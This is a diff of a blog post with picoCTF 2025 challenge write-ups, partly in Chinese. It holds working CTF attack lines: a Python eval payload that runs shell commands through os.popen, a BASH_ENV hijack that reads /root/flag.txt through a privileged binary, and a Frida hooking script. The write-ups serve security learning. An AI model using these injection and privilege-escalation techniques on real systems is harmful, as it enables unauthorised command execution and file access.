@@ -2,23 +2,26 @@
 title: "picoCTF 2025 write-ups"
 published: 2025-03-11T00:00:00.000Z
 description: ""
-tags: []
-category: "general"
+tags: [Writeups, CTF, picoCTF]
+category: CTF
 draft: false
 ---
 # picoCTF 2025 write-ups
 
 ## Web
+
 ### 3v@l
+
 payload: getattr(__import__('o'+'s'), 'po'+'pen')('tac${IFS}'+chr(47)+'fl*').read()
 
 ### SSTI2
-payload: 
 
+payload:
 
 ### WebSockFish
 
 在console裡面控制遊戲
+
 ```
 game.load("8/8/8/8/8/8/8/R7 w - - 0 1");
 true
@@ -50,16 +53,15 @@ undefined
 ```
 
 ### Apriti sesamo
+
 emacs 代表可以在網址後加一個 ~
 會發現網頁原始碼有隱藏的判斷邏輯程式碼
 發現其實就是SHA1 collision
 
 ![image](/images/apriti_sesamo_image1.png)
 
-
-
-
 ### Hash-only 1
+
 ```
 ctf-player@pico-chall$ echo 'cat /root/flag.txt' > /tmp/exploit.sh
 ctf-player@pico-chall$ export BASH_ENV=/tmp/exploit.sh
@@ -71,8 +73,8 @@ picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_ae1d8678}4d4f660d53535446f15c1a3a7b535
 
 <!--more-->
 
-
 ### Hash-only 2
+
 ```
 ctf-player@pico-chall$ ln -s /challenge/flaghasher flaghasher
 ctf-player@pico-chall$ ls
@@ -128,9 +130,8 @@ Computing the MD5 hash of /root/flag.txt....
 picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_9c5db6a7}d77111adc0e4a3034d6e0dac135d32a8  /root/flag.txt
 ```
 
-
-
 ### PIETIME 2
+
 ```
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025picoCTF/pietime2]
 └─$ gdb ./vuln
@@ -179,8 +180,8 @@ You won!
 picoCTF{p13_5h0u1dn'7_134k_bb903549}
 ```
 
-
 ### TapIntoHash
+
 從題目的描述和提供的源代碼來看，這題涉及了一個區塊鏈的範例程式，其中使用了 `sha256` 哈希和加密的部分。你需要進行兩個主要操作：反向工程這段代碼以提取出加密的旗標內容，並解密它。
 
 讓我們從以下幾個關鍵部分入手：
@@ -188,13 +189,13 @@ picoCTF{p13_5h0u1dn'7_134k_bb903549}
 ### 1. 分析 `block_chain.py` 代碼
 
 - `encrypt` 函數: 這個函數會將一個字串進行加密，這裡用了 XOR 與 SHA256 哈希來加密。主要步驟是：
+
   1. 將傳入的 `plaintext` 分割成兩部分，並將中間插入 `inner_txt`。
   2. 接著會對這個新的字串進行填充(padding)。
   3. 然後進行塊加密，將每一個 16 字節的塊進行 XOR 操作，密鑰是基於 `key` 進行 SHA256 哈希運算得到的。
-
 - `decode_transactions` 函數: 這是用來解碼交易資料的，使用了 base64 解碼。
-
 - `main` 函數:
+
   1. 會生成一個隨機的密鑰。
   2. 然後創建區塊鏈並執行工作量證明 (proof of work)，生成多個區塊。
   3. 用這個加密過的區塊鏈字串來加密一個由參數 `token` 生成的字符串。
@@ -217,9 +218,7 @@ picoCTF{p13_5h0u1dn'7_134k_bb903549}
 ### 4. 應該如何進行反向工程
 
 1. **解密 `Encrypted Blockchain`:** 你已經得到了加密過的區塊鏈字串 (`Encrypted Blockchain`) 和密鑰。你需要對 `Encrypted Blockchain` 進行 XOR 解密。
-
 2. **查找 `token` 的作用：** `token` 作為參數傳入 `main` 函數，並插入到了加密過程中。這個 `token` 很可能是與加密相關的一部分，你需要知道它的具體內容。
-
 3. **解碼 `Encrypted Blockchain` 字串：** 由於區塊鏈字串被加密，你需要使用 `encrypt` 函數的相反過程來解密它。
 
 ### 解密的代碼邏輯
@@ -260,13 +259,10 @@ print(decrypted_content)
 
 進行解密後，應該能夠恢復出原始的區塊鏈內容，並從中提取出旗標。
 
-
-
-
-
 ### Binary Instrumentation 2
 
 hook_createfile.js:
+
 ```
 // 創建一個真實的文件以獲取有效句柄  <-------當初這裡我卡超久
 var fileName = "flag.txt";
@@ -276,10 +272,10 @@ Interceptor.attach(Module.getExportByName(null, 'CreateFileA'), {
   onEnter: function (args) {
     this.origPath = Memory.readUtf8String(args[0]);
     console.log("CreateFileA called with: " + this.origPath);
-    
+  
     // 替換為我們的文件名
     args[0] = Memory.allocUtf8String(fileName);
-    
+  
     // 保存其他參數以便調試
     this.dwDesiredAccess = args[1];
     this.dwShareMode = args[2];
@@ -287,14 +283,14 @@ Interceptor.attach(Module.getExportByName(null, 'CreateFileA'), {
     this.dwCreationDisposition = args[4];
     this.dwFlagsAndAttributes = args[5];
     this.hTemplateFile = args[6];
-    
+  
     console.log("Access: " + this.dwDesiredAccess);
     console.log("Share Mode: " + this.dwShareMode);
     console.log("Creation: " + this.dwCreationDisposition);
   },
   onLeave: function (retval) {
     console.log("CreateFileA would return: " + retval);
-    
+  
     // 如果返回無效句柄，替換為我們的有效句柄
     if (retval.compare(ptr("-1")) === 0) {
       console.log("Replacing invalid handle with valid one");
@@ -307,15 +303,15 @@ Interceptor.attach(Module.getExportByName(null, 'CreateFileA'), {
 Interceptor.attach(Module.getExportByName(null, 'WriteFile'), {
     onEnter: function (args) {
       console.log("WriteFile called with buffer at: " + args[1]);
-      
+    
       // 檢查原始緩衝區周圍的內存
       var originalBuffer = args[1];
       console.log("Examining memory around buffer:");
-      
+    
       // 向前搜索100字節
       var forwardData = Memory.readByteArray(originalBuffer, 100);
       console.log("Forward 100 bytes:\n" + hexdump(forwardData));
-      
+    
       // 向後搜索100字節
       try {
         var backwardData = Memory.readByteArray(originalBuffer.sub(100), 100);
@@ -323,7 +319,7 @@ Interceptor.attach(Module.getExportByName(null, 'WriteFile'), {
       } catch (e) {
         console.log("Error reading backward: " + e);
       }
-      
+    
       // 嘗試在緩衝區周圍搜索"picoCTF"字符串
       Process.enumerateRanges('rw-').forEach(function(range) {
         if (range.base.compare(originalBuffer.sub(1024)) <= 0 && 
@@ -350,7 +346,7 @@ Interceptor.attach(Module.getExportByName(null, 'WriteFile'), {
           }
         }
       });
-      
+    
       // 修改WriteFile參數，強制寫入一些數據
       // 注意：這可能會導致程序崩潰，但我們已經捕獲了可能的flag
       if (args[2].toInt32() === 0) {
@@ -372,34 +368,32 @@ Interceptor.attach(Module.getExportByName(null, 'CloseHandle'), {
 Interceptor.attach(Module.getExportByName(null, 'ExitProcess'), {
   onEnter: function (args) {
     console.log("ExitProcess called with code: " + args[0]);
-    
+  
     // 確保我們的文件被關閉
     try {
       realFile.close();
     } catch (e) {
       // 忽略錯誤
     }
-    
+  
     // 檢查是否有任何數據寫入到我們的文件
     try {
       var content = File.readAllText(fileName);
       console.log("Content written to file: " + content);
-      
+    
       if (content.includes("picoCTF")) {
         console.log("FLAG FOUND IN FILE: " + content);
       }
     } catch (e) {
       console.log("Error reading file: " + e);
     }
-    
+  
     // 延遲退出
     console.log("Sleeping before exit...");
     Thread.sleep(2);
   }
 });
 ```
-
-
 
 ```
 PS D:\CyberSecurity\picoCTF2025> frida -f .\bininst2.exe -l .\hook_createfile.js
